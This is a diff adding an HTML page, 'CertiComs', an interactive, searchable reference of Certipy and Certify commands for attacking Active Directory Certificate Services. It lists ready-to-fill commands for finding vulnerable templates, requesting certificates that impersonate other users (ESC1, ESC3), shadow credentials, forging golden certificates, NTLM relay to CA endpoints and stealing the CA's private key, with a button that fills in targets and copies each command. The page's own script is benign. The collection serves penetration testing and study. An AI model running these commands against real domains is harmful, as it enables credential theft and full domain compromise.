@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CertiComs - AD CS Command Reference</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --pink-dark: #ff1493;
+            --pink-medium: #ff69b4;
+            --pink-light: #ffb6d9;
+            --pink-lighter: #ffd9ec;
+            --purple-dark: #8b008b;
+            --purple-medium: #ba55d3;
+            --purple-light: #dda0dd;
+            --purple-lighter: #e6ccff;
+            --bg-dark: #1a0a1f;
+            --bg-medium: #2d1b3d;
+            --bg-light: #3d2a4d;
+            --text-light: #ffffff;
+            --text-muted: #d8bfd8;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, var(--bg-dark) 0%, var(--purple-dark) 100%);
+            color: var(--text-light);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 30px;
+            background: linear-gradient(135deg, var(--pink-dark), var(--purple-medium));
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(255, 20, 147, 0.3);
+        }
+
+        h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            background: linear-gradient(45deg, var(--pink-lighter), var(--purple-lighter));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            font-size: 1.2em;
+            color: var(--pink-lighter);
+            font-weight: 300;
+        }
+
+        .variables-section {
+            margin-bottom: 20px;
+            background: var(--bg-medium);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+        }
+
+        .variables-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .variables-header h2 {
+            color: var(--pink-light);
+            font-size: 1.3em;
+        }
+
+        .toggle-icon {
+            font-size: 1.5em;
+            transition: transform 0.3s ease;
+        }
+
+        .toggle-icon.collapsed {
+            transform: rotate(-90deg);
+        }
+
+        .variables-content {
+            margin-top: 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            max-height: 500px;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+        }
+
+        .variables-content.collapsed {
+            max-height: 0;
+            margin-top: 0;
+        }
+
+        .var-input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .var-input-group label {
+            color: var(--purple-light);
+            font-size: 0.85em;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .var-input-group input {
+            padding: 10px;
+            border: 2px solid var(--purple-medium);
+            border-radius: 8px;
+            background: var(--bg-light);
+            color: var(--text-light);
+            font-size: 0.9em;
+            transition: all 0.2s ease;
+        }
+
+        .var-input-group input:focus {
+            outline: none;
+            border-color: var(--pink-medium);
+            box-shadow: 0 0 10px rgba(255, 105, 180, 0.3);
+        }
+
+        .var-actions {
+            margin-top: 15px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .var-btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.2s ease;
+        }
+
+        .var-btn-save {
+            background: linear-gradient(135deg, var(--pink-medium), var(--purple-medium));
+            color: white;
+        }
+
+        .var-btn-clear {
+            background: var(--bg-light);
+            color: var(--text-light);
+            border: 2px solid var(--purple-light);
+        }
+
+        .var-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 105, 180, 0.4);
+        }
+
+        .search-container {
+            margin-bottom: 30px;
+            background: var(--bg-medium);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+        }
+
+        #search {
+            width: 100%;
+            padding: 15px 20px;
+            font-size: 16px;
+            border: 2px solid var(--purple-medium);
+            border-radius: 10px;
+            background: var(--bg-light);
+            color: var(--text-light);
+            transition: all 0.3s ease;
+        }
+
+        #search:focus {
+            outline: none;
+            border-color: var(--pink-medium);
+            box-shadow: 0 0 15px rgba(255, 105, 180, 0.5);
+        }
+
+        .filters {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+
+        .filter-group {
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .filter-group h3 {
+            font-size: 0.9em;
+            color: var(--pink-light);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .filter-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .tag {
+            padding: 6px 12px;
+            background: var(--bg-light);
+            border: 2px solid var(--purple-light);
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.85em;
+            transition: all 0.2s ease;
+            user-select: none;
+        }
+
+        .tag:hover {
+            background: var(--purple-medium);
+            border-color: var(--pink-medium);
+            transform: translateY(-2px);
+        }
+
+        .tag.active {
+            background: linear-gradient(135deg, var(--pink-medium), var(--purple-medium));
+            border-color: var(--pink-light);
+            font-weight: bold;
+        }
+
+        table {
+            width: 100%;
+            background: var(--bg-medium);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+        }
+
+        thead {
+            background: linear-gradient(135deg, var(--purple-dark), var(--pink-dark));
+        }
+
+        th {
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 0.9em;
+        }
+
+        tbody tr {
+            border-bottom: 1px solid var(--bg-light);
+            transition: all 0.2s ease;
+        }
+
+        tbody tr:hover {
+            background: var(--bg-light);
+        }
+
+        tbody tr.hidden {
+            display: none;
+        }
+
+        td {
+            padding: 15px;
+            vertical-align: top;
+        }
+
+        .command-cell {
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            position: relative;
+        }
+
+        .command-text {
+            background: var(--bg-dark);
+            padding: 10px;
+            border-radius: 8px;
+            border-left: 4px solid var(--pink-medium);
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .var-highlight {
+            color: var(--pink-lighter);
+            font-weight: bold;
+        }
+
+        .copy-btn {
+            background: linear-gradient(135deg, var(--pink-medium), var(--purple-medium));
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.85em;
+            margin-top: 8px;
+            transition: all 0.2s ease;
+        }
+
+        .copy-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 105, 180, 0.4);
+        }
+
+        .copy-btn:active {
+            transform: translateY(0);
+        }
+
+        .command-tag {
+            display: inline-block;
+            padding: 4px 10px;
+            margin: 3px;
+            background: var(--purple-light);
+            color: var(--bg-dark);
+            border-radius: 12px;
+            font-size: 0.75em;
+            font-weight: 600;
+        }
+
+        .command-tag.tool-certipy {
+            background: var(--pink-light);
+        }
+
+        .command-tag.tool-certify {
+            background: var(--purple-lighter);
+        }
+
+        .command-tag.cred-password {
+            background: #b19cd9;
+        }
+
+        .command-tag.cred-hash {
+            background: #ff8fab;
+        }
+
+        .command-tag.cred-cert {
+            background: #ffc4d6;
+        }
+
+        .command-tag.attack-enum {
+            background: #dda0dd;
+        }
+
+        .command-tag.attack-exploit {
+            background: #ffb6d9;
+        }
+
+        .command-tag.attack-forge {
+            background: #e6ccff;
+        }
+
+        .stats {
+            text-align: center;
+            margin-top: 20px;
+            color: var(--text-muted);
+            font-size: 0.9em;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: var(--text-muted);
+            font-size: 0.9em;
+        }
+
+        .footer a {
+            color: var(--pink-light);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            color: var(--pink-lighter);
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>✨ CertiComs ✨</h1>
+            <div class="subtitle">AD CS Command Reference - Certipy & Certify</div>
+        </header>
+
+        <div class="variables-section">
+            <div class="variables-header" onclick="toggleVariables()">
+                <h2>⚙️ Quick Variables</h2>
+                <span class="toggle-icon" id="toggle-icon">▼</span>
+            </div>
+            <div class="variables-content" id="variables-content">
+                <div class="var-input-group">
+                    <label>Domain</label>
+                    <input type="text" id="var-domain" placeholder="domain.local">
+                </div>
+                <div class="var-input-group">
+                    <label>DC IP</label>
+                    <input type="text" id="var-dc-ip" placeholder="10.10.10.10">
+                </div>
+                <div class="var-input-group">
+                    <label>DC Hostname</label>
+                    <input type="text" id="var-dc-host" placeholder="dc.domain.local">
+                </div>
+                <div class="var-input-group">
+                    <label>Username</label>
+                    <input type="text" id="var-user" placeholder="user@domain.local">
+                </div>
+                <div class="var-input-group">
+                    <label>Password</label>
+                    <input type="text" id="var-password" placeholder="password">
+                </div>
+                <div class="var-input-group">
+                    <label>NT Hash</label>
+                    <input type="text" id="var-hash" placeholder="ntlmhash">
+                </div>
+                <div class="var-input-group">
+                    <label>CA Name</label>
+                    <input type="text" id="var-ca" placeholder="CA-NAME">
+                </div>
+                <div class="var-input-group">
+                    <label>Template</label>
+                    <input type="text" id="var-template" placeholder="User">
+                </div>
+                <div class="var-input-group">
+                    <label>Target User</label>
+                    <input type="text" id="var-target" placeholder="administrator">
+                </div>
+                <div class="var-input-group">
+                    <label>Certificate File</label>
+                    <input type="text" id="var-pfx" placeholder="cert.pfx">
+                </div>
+            </div>
+            <div class="var-actions" id="var-actions" style="display: none;">
+                <button class="var-btn var-btn-save" onclick="saveVariables()">💾 Save Variables</button>
+                <button class="var-btn var-btn-clear" onclick="clearVariables()">🗑️ Clear All</button>
+            </div>
+        </div>
+
+        <div class="search-container">
+            <input type="text" id="search" placeholder="🔍 Search commands, techniques, or vulnerabilities...">
+
+            <div class="filters">
+                <div class="filter-group">
+                    <h3>🛠️ Tool</h3>
+                    <div class="filter-tags" id="tool-filters">
+                        <span class="tag" data-filter="tool" data-value="certipy">Certipy</span>
+                        <span class="tag" data-filter="tool" data-value="certify">Certify</span>
+                    </div>
+                </div>
+
+                <div class="filter-group">
+                    <h3>💎 What You Have</h3>
+                    <div class="filter-tags" id="cred-filters">
+                        <span class="tag" data-filter="cred" data-value="password">Password</span>
+                        <span class="tag" data-filter="cred" data-value="hash">Hash</span>
+                        <span class="tag" data-filter="cred" data-value="certificate">Certificate</span>
+                        <span class="tag" data-filter="cred" data-value="no-cred">No Credentials</span>
+                    </div>
+                </div>
+
+                <div class="filter-group">
+                    <h3>🎯 Attack Type</h3>
+                    <div class="filter-tags" id="attack-filters">
+                        <span class="tag" data-filter="attack" data-value="enumeration">Enumeration</span>
+                        <span class="tag" data-filter="attack" data-value="exploitation">Exploitation</span>
+                        <span class="tag" data-filter="attack" data-value="forge">Forge</span>
+                        <span class="tag" data-filter="attack" data-value="relay">Relay</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <table id="commands-table">
+            <thead>
+                <tr>
+                    <th style="width: 20%;">Command</th>
+                    <th style="width: 50%;">Example</th>
+                    <th style="width: 30%;">Tags</th>
+                </tr>
+            </thead>
+            <tbody id="commands-tbody">
+                <!-- Commands will be populated by JavaScript -->
+            </tbody>
+        </table>
+
+        <div class="stats" id="stats">
+            <span id="visible-count">0</span> / <span id="total-count">0</span> commands shown
+        </div>
+
+        <div class="footer">
+            Made with 💜 by panko for the AD CS pwning community |
+            <a href="https://github.com/ly4k/Certipy" target="_blank">Certipy by ly4k</a> |
+            <a href="https://github.com/GhostPack/Certify" target="_blank">Certify by GhostPack</a> |
+            Inspired by <a href="https://wadcoms.github.io/" target="_blank">WADComs</a>
+        </div>
+    </div>
+
+    <script>
+        const VAR_MAPPINGS = {
+            'DOMAIN': 'var-domain',
+            'DC_IP': 'var-dc-ip',
+            'DC_HOST': 'var-dc-host',
+            'USER': 'var-user',
+            'PASSWORD': 'var-password',
+            'HASH': 'var-hash',
+            'CA_NAME': 'var-ca',
+            'TEMPLATE': 'var-template',
+            'TARGET': 'var-target',
+            'PFX_FILE': 'var-pfx'
+        };
+
+        const commands = [
+            // CERTIPY COMMANDS
+            {
+                name: "Certipy - Find Vulnerable Templates",
+                command: "certipy-ad find -u 'USER' -p 'PASSWORD' -dc-ip DC_IP -vulnerable -stdout",
+                description: "Enumerate and show only vulnerable certificate templates (ESC1-ESC16)",
+                tags: ["tool:certipy", "cred:password", "attack:enumeration"],
+                tool: ["certipy"],
+                cred: ["password"],
+                attack: ["enumeration"]
+            },
+            {
+                name: "Certipy - Find with Hash",
+                command: "certipy-ad find -u 'USER' -hashes ':HASH' -dc-ip DC_IP -json -output results",
+                description: "Enumerate using NTLM hash and export to JSON",
+                tags: ["tool:certipy", "cred:hash", "attack:enumeration"],
+                tool: ["certipy"],
+                cred: ["hash"],
+                attack: ["enumeration"]
+            },
+            {
+                name: "Certipy - Request Certificate (ESC1)",
+                command: "certipy-ad req -u 'USER' -p 'PASSWORD' -dc-ip DC_IP -ca 'CA_NAME' -template 'TEMPLATE' -upn 'TARGET@DOMAIN'",
+                description: "Request certificate with alternative UPN (ESC1)",
+                tags: ["tool:certipy", "cred:password", "attack:exploitation"],
+                tool: ["certipy"],
+                cred: ["password"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certipy - Auth with Certificate",
+                command: "certipy-ad auth -pfx PFX_FILE -dc-ip DC_IP",
+                description: "Authenticate using certificate to obtain TGT and NT hash",
+                tags: ["tool:certipy", "cred:certificate", "attack:exploitation"],
+                tool: ["certipy"],
+                cred: ["certificate"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certipy - Shadow Credentials Auto",
+                command: "certipy-ad shadow auto -u 'USER' -p 'PASSWORD' -dc-ip DC_IP -account 'TARGET'",
+                description: "Automatic Shadow Credentials attack (add key, auth, restore)",
+                tags: ["tool:certipy", "cred:password", "attack:exploitation"],
+                tool: ["certipy"],
+                cred: ["password"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certipy - Shadow Add Key",
+                command: "certipy-ad shadow add -u 'USER' -p 'PASSWORD' -dc-ip DC_IP -account 'TARGET'",
+                description: "Add a Key Credential Link to target account",
+                tags: ["tool:certipy", "cred:password", "attack:exploitation"],
+                tool: ["certipy"],
+                cred: ["password"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certipy - Forge Golden Certificate",
+                command: "certipy-ad forge -ca-pfx ca.pfx -upn 'TARGET@DOMAIN' -subject 'CN=TARGET,CN=Users,DC=DOMAIN'",
+                description: "Create a Golden Certificate for privilege escalation",
+                tags: ["tool:certipy", "cred:certificate", "attack:forge"],
+                tool: ["certipy"],
+                cred: ["certificate"],
+                attack: ["forge"]
+            },
+            {
+                name: "Certipy - HTTP Relay (ESC8)",
+                command: "certipy-ad relay -target 'http://DC_HOST/certsrv/certfnsh.asp'",
+                description: "NTLM relay to AD CS HTTP endpoint (ESC8)",
+                tags: ["tool:certipy", "cred:no-cred", "attack:relay"],
+                tool: ["certipy"],
+                cred: ["no-cred"],
+                attack: ["relay"]
+            },
+            {
+                name: "Certipy - RPC Relay (ESC11)",
+                command: "certipy-ad relay -target 'rpc://DC_HOST' -ca 'CA_NAME'",
+                description: "NTLM relay to AD CS RPC endpoint (ESC11)",
+                tags: ["tool:certipy", "cred:no-cred", "attack:relay"],
+                tool: ["certipy"],
+                cred: ["no-cred"],
+                attack: ["relay"]
+            },
+            {
+                name: "Certipy - CA Backup",
+                command: "certipy-ad ca -u 'USER' -p 'PASSWORD' -dc-ip DC_IP -ca 'CA_NAME' -backup",
+                description: "Backup CA certificate and private key",
+                tags: ["tool:certipy", "cred:password", "attack:exploitation"],
+                tool: ["certipy"],
+                cred: ["password"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certipy - Issue Request (ESC7)",
+                command: "certipy-ad ca -u 'USER' -p 'PASSWORD' -dc-ip DC_IP -ca 'CA_NAME' -issue-request 123",
+                description: "Issue a pending certificate request (ESC7)",
+                tags: ["tool:certipy", "cred:password", "attack:exploitation"],
+                tool: ["certipy"],
+                cred: ["password"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certipy - Template ESC1 Config",
+                command: "certipy-ad template -u 'USER' -p 'PASSWORD' -dc-ip DC_IP -template 'TEMPLATE' -write-default-configuration",
+                description: "Make template vulnerable to ESC1",
+                tags: ["tool:certipy", "cred:password", "attack:exploitation"],
+                tool: ["certipy"],
+                cred: ["password"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certipy - Request On-Behalf-Of (ESC3)",
+                command: "certipy-ad req -u 'USER' -p 'PASSWORD' -dc-ip DC_IP -ca 'CA_NAME' -template 'User' -on-behalf-of 'DOMAIN\\TARGET' -pfx agent.pfx",
+                description: "Request certificate on behalf of another user (ESC3)",
+                tags: ["tool:certipy", "cred:password", "cred:certificate", "attack:exploitation"],
+                tool: ["certipy"],
+                cred: ["password", "certificate"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certipy - Account Update (ESC10)",
+                command: "certipy-ad account update -u 'USER' -p 'PASSWORD' -dc-ip DC_IP -user 'computer$' -dns 'DC_HOST'",
+                description: "Update account DNS hostname (ESC10/ESC13)",
+                tags: ["tool:certipy", "cred:password", "attack:exploitation"],
+                tool: ["certipy"],
+                cred: ["password"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certipy - Web Enrollment Request",
+                command: "certipy-ad req -u 'USER' -p 'PASSWORD' -dc-ip DC_IP -ca 'CA_NAME' -template 'TEMPLATE' -web",
+                description: "Request certificate via Web Enrollment",
+                tags: ["tool:certipy", "cred:password", "attack:exploitation"],
+                tool: ["certipy"],
+                cred: ["password"],
+                attack: ["exploitation"]
+            },
+
+            // CERTIFY COMMANDS
+            {
+                name: "Certify - Find Vulnerable CAs",
+                command: "Certify.exe cas /domain:DOMAIN /vulnerable",
+                description: "Find information about vulnerable Certificate Authorities",
+                tags: ["tool:certify", "cred:no-cred", "attack:enumeration"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["enumeration"]
+            },
+            {
+                name: "Certify - Find Vulnerable Templates",
+                command: "Certify.exe find /vulnerable /domain:DOMAIN",
+                description: "Find vulnerable certificate templates using default groups",
+                tags: ["tool:certify", "cred:no-cred", "attack:enumeration"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["enumeration"]
+            },
+            {
+                name: "Certify - Find Current User Context",
+                command: "Certify.exe find /vulnerable /currentuser",
+                description: "Find vulnerable templates using all groups current user is in",
+                tags: ["tool:certify", "cred:no-cred", "attack:enumeration"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["enumeration"]
+            },
+            {
+                name: "Certify - Enumerate All Templates",
+                command: "Certify.exe find /domain:DOMAIN /ca:DC_HOST\\CA_NAME",
+                description: "Enumerate all certificate templates from specific CA",
+                tags: ["tool:certify", "cred:no-cred", "attack:enumeration"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["enumeration"]
+            },
+            {
+                name: "Certify - Request with AltName (ESC1)",
+                command: "Certify.exe request /ca:DC_HOST\\CA_NAME /template:TEMPLATE /altname:TARGET@DOMAIN",
+                description: "Request certificate with alternative name (ESC1)",
+                tags: ["tool:certify", "cred:no-cred", "attack:exploitation"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certify - Request Client Auth",
+                command: "Certify.exe request /ca:DC_HOST\\CA_NAME /template:TEMPLATE /altname:TARGET",
+                description: "Request certificate for client authentication",
+                tags: ["tool:certify", "cred:no-cred", "attack:exploitation"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certify - Download Certificate",
+                command: "Certify.exe download /ca:DC_HOST\\CA_NAME /id:123",
+                description: "Download a previously requested certificate by ID",
+                tags: ["tool:certify", "cred:no-cred", "attack:exploitation"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certify - Enumerate Client Auth Templates",
+                command: "Certify.exe find /clientauth /domain:DOMAIN",
+                description: "Find templates configured for client authentication",
+                tags: ["tool:certify", "cred:no-cred", "attack:enumeration"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["enumeration"]
+            },
+            {
+                name: "Certify - Export to File",
+                command: "Certify.exe find /vulnerable /quiet /outfile:C:\\temp\\vulntemplates.txt",
+                description: "Export vulnerable templates to file with minimal output",
+                tags: ["tool:certify", "cred:no-cred", "attack:enumeration"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["enumeration"]
+            },
+            {
+                name: "Certify - Request Agent Certificate",
+                command: "Certify.exe request /ca:DC_HOST\\CA_NAME /template:EnrollmentAgent",
+                description: "Request an enrollment agent certificate (ESC3)",
+                tags: ["tool:certify", "cred:no-cred", "attack:exploitation"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certify - Request On-Behalf-Of (ESC3)",
+                command: "Certify.exe request /ca:DC_HOST\\CA_NAME /template:User /onbehalfof:DOMAIN\\TARGET /enrollcert:agent.pfx",
+                description: "Request certificate on behalf of another user (ESC3)",
+                tags: ["tool:certify", "cred:certificate", "attack:exploitation"],
+                tool: ["certify"],
+                cred: ["certificate"],
+                attack: ["exploitation"]
+            },
+            {
+                name: "Certify - Show CA Security",
+                command: "Certify.exe cas /ca:DC_HOST\\CA_NAME /showAllPermissions",
+                description: "Show all CA permissions for privilege escalation paths",
+                tags: ["tool:certify", "cred:no-cred", "attack:enumeration"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["enumeration"]
+            },
+            {
+                name: "Certify - Enumerate PKI Objects",
+                command: "Certify.exe pkiobjects /domain:DOMAIN",
+                description: "Identify PKI infrastructure objects and issuance policies",
+                tags: ["tool:certify", "cred:no-cred", "attack:enumeration"],
+                tool: ["certify"],
+                cred: ["no-cred"],
+                attack: ["enumeration"]
+            },
+        ];
+
+        let activeFilters = {
+            tool: [],
+            cred: [],
+            attack: []
+        };
+
+        let variables = {};
+
+        function toggleVariables() {
+            const content = document.getElementById('variables-content');
+            const actions = document.getElementById('var-actions');
+            const icon = document.getElementById('toggle-icon');
+
+            content.classList.toggle('collapsed');
+            icon.classList.toggle('collapsed');
+
+            if (content.classList.contains('collapsed')) {
+                actions.style.display = 'none';
+            } else {
+                actions.style.display = 'flex';
+            }
+        }
+
+        function saveVariables() {
+            variables = {};
+            for (let varName in VAR_MAPPINGS) {
+                const inputId = VAR_MAPPINGS[varName];
+                const value = document.getElementById(inputId).value.trim();
+                if (value) {
+                    variables[varName] = value;
+                }
+            }
+            localStorage.setItem('certicoms_vars', JSON.stringify(variables));
+            renderCommands();
+        }
+
+        function clearVariables() {
+            variables = {};
+            for (let varName in VAR_MAPPINGS) {
+                const inputId = VAR_MAPPINGS[varName];
+                document.getElementById(inputId).value = '';
+            }
+            localStorage.removeItem('certicoms_vars');
+            renderCommands();
+        }
+
+        function loadVariables() {
+            const saved = localStorage.getItem('certicoms_vars');
+            if (saved) {
+                variables = JSON.parse(saved);
+                for (let varName in variables) {
+                    const inputId = VAR_MAPPINGS[varName];
+                    if (inputId) {
+                        document.getElementById(inputId).value = variables[varName];
+                    }
+                }
+            }
+        }
+
+        function replaceVariables(command) {
+            let replaced = command;
+            for (let varName in variables) {
+                const regex = new RegExp(varName, 'g');
+                replaced = replaced.replace(regex, variables[varName]);
+            }
+            return replaced;
+        }
+
+        function highlightVariables(command) {
+            let highlighted = command;
+            for (let varName in VAR_MAPPINGS) {
+                const regex = new RegExp(varName, 'g');
+                highlighted = highlighted.replace(regex, `<span class="var-highlight">${varName}</span>`);
+            }
+            return highlighted;
+        }
+
+        function renderCommands() {
+            const tbody = document.getElementById('commands-tbody');
+            const searchTerm = document.getElementById('search').value.toLowerCase();
+
+            tbody.innerHTML = '';
+            let visibleCount = 0;
+
+            commands.forEach((cmd, index) => {
+                let matchesFilters = true;
+
+                for (let filterType in activeFilters) {
+                    if (activeFilters[filterType].length > 0) {
+                        const hasMatch = activeFilters[filterType].some(filterValue =>
+                            cmd[filterType] && cmd[filterType].includes(filterValue)
+                        );
+                        if (!hasMatch) {
+                            matchesFilters = false;
+                            break;
+                        }
+                    }
+                }
+
+                const matchesSearch = searchTerm === '' ||
+                    cmd.name.toLowerCase().includes(searchTerm) ||
+                    cmd.command.toLowerCase().includes(searchTerm) ||
+                    cmd.description.toLowerCase().includes(searchTerm);
+
+                const isVisible = matchesFilters && matchesSearch;
+
+                const row = document.createElement('tr');
+                if (!isVisible) {
+                    row.classList.add('hidden');
+                } else {
+                    visibleCount++;
+                }
+
+                const tagsHtml = cmd.tags.map(tag => {
+                    const [tagClass, tagValue] = tag.split(':');
+                    return `<span class="command-tag ${tagClass}-${tagValue}">${tag}</span>`;
+                }).join('');
+
+                const displayCommand = Object.keys(variables).length > 0
+                    ? replaceVariables(cmd.command)
+                    : highlightVariables(cmd.command);
+
+                row.innerHTML = `
+                    <td><strong>${cmd.name}</strong><br><small style="color: var(--text-muted);">${cmd.description}</small></td>
+                    <td class="command-cell">
+                        <div class="command-text">${displayCommand}</div>
+                        <button class="copy-btn" onclick="copyCommand(${index})">📋 Copy</button>
+                    </td>
+                    <td>${tagsHtml}</td>
+                `;
+
+                tbody.appendChild(row);
+            });
+
+            document.getElementById('visible-count').textContent = visibleCount;
+            document.getElementById('total-count').textContent = commands.length;
+        }
+
+        function copyCommand(index) {
+            const command = replaceVariables(commands[index].command);
+            navigator.clipboard.writeText(command).then(() => {
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.textContent = '✅ Copied!';
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                }, 2000);
+            });
+        }
+
+        document.querySelectorAll('.tag').forEach(tag => {
+            tag.addEventListener('click', function() {
+                const filterType = this.dataset.filter;
+                const filterValue = this.dataset.value;
+
+                this.classList.toggle('active');
+
+                if (this.classList.contains('active')) {
+                    if (!activeFilters[filterType].includes(filterValue)) {
+                        activeFilters[filterType].push(filterValue);
+                    }
+                } else {
+                    activeFilters[filterType] = activeFilters[filterType].filter(v => v !== filterValue);
+                }
+
+                renderCommands();
+            });
+        });
+
+        document.getElementById('search').addEventListener('input', renderCommands);
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                document.getElementById('search').value = '';
+                document.querySelectorAll('.tag.active').forEach(tag => tag.classList.remove('active'));
+                activeFilters = { tool: [], cred: [], attack: [] };
+                renderCommands();
+            } else if (e.key.length === 1 && !e.ctrlKey && !e.metaKey && document.activeElement.tagName !== 'INPUT') {
+                document.getElementById('search').focus();
+            }
+        });
+
+        // Auto-save variables on input
+        Object.values(VAR_MAPPINGS).forEach(inputId => {
+            const input = document.getElementById(inputId);
+            if (input) {
+                input.addEventListener('change', saveVariables);
+            }
+        });
+
+        // Initialize
+        loadVariables();
+        renderCommands();
+    </script>
+</body>
+</html>
